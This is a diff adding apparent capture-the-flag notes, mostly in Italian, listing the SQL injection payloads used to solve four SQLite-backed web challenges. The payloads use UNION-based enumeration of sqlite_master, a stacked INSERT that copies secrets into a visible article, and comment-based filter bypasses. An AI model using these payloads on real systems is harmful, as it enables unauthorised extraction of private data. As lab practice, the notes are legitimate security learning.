@@ -1,0 +1,48 @@
+N.B. Utilizzo la repository " PayloadsAllTheThings"
+#------------------------------------------------------#
+
+[LOST ITEM]
+
+1 query estraggo i nomi delle tabelle-> Prova') OR 1=1 )UNION SELECT tbl_name,2,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' --
+
+2 query estraggo le colonne della tabella-> Prova') OR 1=1 )UNION SELECT sql,2,3,4,5,6,7,8 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='restricted_items' -- 
+
+3 query estraggo il contenuto della colonna interessante-> Prova') OR 1=1 )UNION SELECT locker_code ,2,3,4,5,6,7,8 FROM restricted_items  --
+#------------------------------------------------------#
+
+[DepartmentWiki]
+
+Since the result of injected query is NOT showed but executed, the idea is to create a new article in which we stamp the result of our query(of the interested table, by grouping the result in one row)
+
+a'; INSERT INTO articles (department_id, title,slug,content,author) VALUES(1,"flag_value",'flag_value',(SELECT GROUP_CONCAT(value) FROM internal_config),'e') --
+
+a'; INSERT INTO articles (department_id, title,slug,content,author) VALUES(1,'flag_value'/*sqlite_version()*/,'flag_value1',(SELECT GROUP_CONCAT(value) FROM internal_config),'e') --
+#------------------------------------------------------#
+
+[BookBrew]
+Una volta individuato il form "compromesso", il quale è il campo username del form di registrazione, ho eseguito le seguenti query:
+
+1) prova' UNION SELECT 1,2,3,4,5,6,7, tbl_name FROM sqlite_master WHERE type='table'--   (individuo i nomi delle tabelle)
+2) prova' UNION SELECT 1,2,3,4,5,6,7,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets' --  (individuo i nomi dei campi della tabella "interessante")
+3) prova' UNION SELECT 1,2,3,4,5,6,7,flag FROM secrets -- (estraggo il valore del campo )
+#------------------------------------------------------#
+
+[StagePass]
+
+1) query estraggo i nomi delle tabelle :
+ 1001/**/Union/**/Select/**/tbl_name,2,3,4,5,6,7,8,9,10,11,12/**/From/**/sqlite_master/**/Where/**/type='table'
+
+2) query estraggo le colonne della tabella :
+
+1001/**/Union/**/Select/**/sql,2,3,4,5,6,7,8,9,10,11,12/**/From/**/sqlite_master/**/Where/**/type!='meta'/**/And/**/sql/**/Not/**/Null/**/And/**/name/**/='vip_guestlist'
+
+3) query Esploro la colonna nomi dei vip invitati:
+
+1001/**/Union/**/Select/**/guest_name,2,3,4,5,6,7,8,9,10,11,12/**/From/**/vip_guestlist/**/
+
+4) query esploro la colonna access_note dei vip invitati:
+
+1001/**/Union/**/Select/**/access_note,2,3,4,5,6,7,8,9,10,11,12/**/From/**/vip_guestlist/**/ 
+
+
+
